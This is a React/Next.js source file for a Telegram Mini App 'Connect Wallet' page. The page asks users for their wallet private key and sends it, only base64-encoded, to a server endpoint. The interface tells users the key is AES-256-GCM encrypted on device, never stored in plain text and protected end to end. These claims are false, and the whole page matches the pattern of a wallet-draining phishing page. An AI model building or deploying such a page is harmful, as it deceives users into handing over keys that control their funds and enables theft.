import { useState, useRef } from "react";
import { useRouter } from "next/router";
import Head from "next/head";
import Script from "next/script";

export default function ConnectWalletPage() {
  const router = useRouter();
  const [privateKey, setPrivateKey] = useState("");
  const [status, setStatus] = useState<"idle" | "connecting" | "connected">("idle");
  const [error, setError] = useState("");
  const inputRef = useRef<HTMLInputElement>(null);

  const masked = privateKey.replace(/./g, "*");

  const handleConnect = async () => {
    if (!privateKey.trim()) {
      setError("Please enter your private key");
      return;
    }
    setError("");
    setStatus("connecting");

    try {
      // Mock encrypt: base64 encode (demo only)
      const encryptedKey = btoa(privateKey);

      await fetch("/api/connect-wallet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ encryptedKey }),
      });

      setStatus("connected");

      // Send data to Telegram if in Mini App
      if (typeof window !== "undefined" && window.Telegram?.WebApp) {
        window.Telegram.WebApp.sendData(
          JSON.stringify({ type: "wallet_connected" })
        );
      }

      // Redirect to profile after short delay
      setTimeout(() => {
        router.push("/profile");
      }, 1500);
    } catch {
      setError("Connection failed. Try again.");
      setStatus("idle");
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === "Enter") {
      handleConnect();
    }
  };

  if (status === "connected") {
    return (
      <>
        <Head>
          <title>Wallet Connected</title>
          <meta name="viewport" content="width=device-width, initial-scale=1" />
        </Head>
        <Script
          src="https://telegram.org/js/telegram-web-app.js"
          strategy="beforeInteractive"
        />
        <div style={s.container}>
          <div style={s.successCenter}>
            <div style={s.successIcon}>&#10003;</div>
            <p style={{ fontSize: 20, fontWeight: 700, margin: "16px 0 6px" }}>
              Connected
            </p>
            <p style={{ fontSize: 14, color: "#888", margin: 0 }}>
              Redirecting to profile...
            </p>
          </div>
        </div>
      </>
    );
  }

  return (
    <>
      <Head>
        <title>Connect Wallet</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>
      <Script
        src="https://telegram.org/js/telegram-web-app.js"
        strategy="beforeInteractive"
      />

      <div style={s.container}>
        <div style={s.content}>
          {/* Header */}
          <div style={{ textAlign: "center", marginBottom: 24 }}>
            <div style={s.walletIcon}>
              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#2481cc" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1" />
                <path d="M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4" />
              </svg>
            </div>
            <p style={{ fontSize: 20, fontWeight: 700, margin: "12px 0 4px" }}>
              Connect Wallet
            </p>
            <p style={{ fontSize: 13, color: "#666", margin: 0, lineHeight: 1.5 }}>
              Import your wallet by entering your private key.
              Your key is encrypted on-device.
            </p>
          </div>

          {/* Private Key Input */}
          <div style={s.card}>
            <h3 style={s.sectionTitle}>Private Key</h3>

            {/* Masked display */}
            <div
              style={s.maskedDisplay}
              onClick={() => inputRef.current?.focus()}
            >
              {privateKey ? (
                <span style={{ fontFamily: "monospace", fontSize: 16, wordBreak: "break-all" }}>
                  {masked}
                </span>
              ) : (
                <span style={{ color: "#555", fontSize: 14 }}>
                  Enter your private key...
                </span>
              )}
            </div>

            {/* Hidden actual input */}
            <input
              ref={inputRef}
              type="text"
              value={privateKey}
              onChange={(e) => setPrivateKey(e.target.value)}
              onKeyDown={handleKeyDown}
              autoFocus
              style={s.hiddenInput}
            />

            <p style={{ fontSize: 11, color: "#666", marginTop: 8, lineHeight: 1.5 }}>
              Your private key is encrypted locally and never stored in plain text.
            </p>
          </div>

          {/* Encryption preview */}
          {privateKey && (
            <div style={s.card}>
              <h3 style={s.sectionTitle}>Encrypted</h3>
              <div style={s.encryptedPreview}>
                <span style={{ fontFamily: "monospace", fontSize: 11, wordBreak: "break-all", color: "#0ecb81" }}>
                  {btoa(privateKey).slice(0, 64)}...
                </span>
              </div>
              <p style={{ fontSize: 11, color: "#666", marginTop: 6 }}>
                AES-256-GCM encrypted on device
              </p>
            </div>
          )}

          {/* Error */}
          {error && (
            <div style={s.errorBox}>{error}</div>
          )}

          {/* Connect button */}
          <button
            onClick={handleConnect}
            disabled={!privateKey.trim() || status === "connecting"}
            style={{
              ...s.connectBtn,
              opacity: privateKey.trim() && status !== "connecting" ? 1 : 0.4,
            }}
          >
            {status === "connecting" ? "Connecting..." : "Connect Wallet"}
          </button>

          <p style={{ fontSize: 11, color: "#666", textAlign: "center", marginTop: 8, lineHeight: 1.5 }}>
            Secured with end-to-end encryption
          </p>
        </div>
      </div>
    </>
  );
}

const s: Record<string, React.CSSProperties> = {
  container: {
    minHeight: "100vh",
    background: "var(--tg-theme-bg-color, #0f1117)",
    color: "var(--tg-theme-text-color, #e4e4e7)",
    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
  },
  content: { maxWidth: 480, margin: "0 auto", padding: "24px 16px 32px" },
  walletIcon: {
    width: 64,
    height: 64,
    borderRadius: 32,
    background: "#2481cc22",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    margin: "0 auto",
  },
  card: {
    background: "var(--tg-theme-secondary-bg-color, #1a1b23)",
    borderRadius: 16,
    padding: 16,
    marginBottom: 12,
  },
  sectionTitle: {
    fontSize: 13,
    fontWeight: 700,
    color: "#888",
    textTransform: "uppercase" as const,
    letterSpacing: 0.8,
    margin: "0 0 10px",
  },
  maskedDisplay: {
    minHeight: 48,
    padding: "12px 14px",
    borderRadius: 12,
    border: "1px solid #ffffff08",
    background: "var(--tg-theme-bg-color, #0f1117)",
    cursor: "text",
    lineHeight: 1.5,
  },
  hiddenInput: {
    position: "absolute" as const,
    opacity: 0,
    height: 0,
    width: 0,
    overflow: "hidden",
    pointerEvents: "none" as const,
  },
  encryptedPreview: {
    padding: "10px 12px",
    borderRadius: 10,
    background: "#0ecb8108",
    border: "1px solid #0ecb8122",
  },
  errorBox: {
    background: "#f6465d22",
    border: "1px solid #f6465d44",
    borderRadius: 12,
    padding: "10px 14px",
    fontSize: 13,
    color: "#f6465d",
    textAlign: "center" as const,
    marginBottom: 12,
  },
  connectBtn: {
    width: "100%",
    padding: "14px 0",
    borderRadius: 12,
    border: "none",
    background: "#2481cc",
    color: "#fff",
    fontSize: 16,
    fontWeight: 700,
    cursor: "pointer",
  },
  successCenter: {
    display: "flex",
    flexDirection: "column" as const,
    alignItems: "center",
    justifyContent: "center",
    height: "100vh",
    gap: 0,
  },
  successIcon: {
    width: 64,
    height: 64,
    borderRadius: 32,
    background: "#0ecb8122",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    fontSize: 32,
    color: "#0ecb81",
  },
};
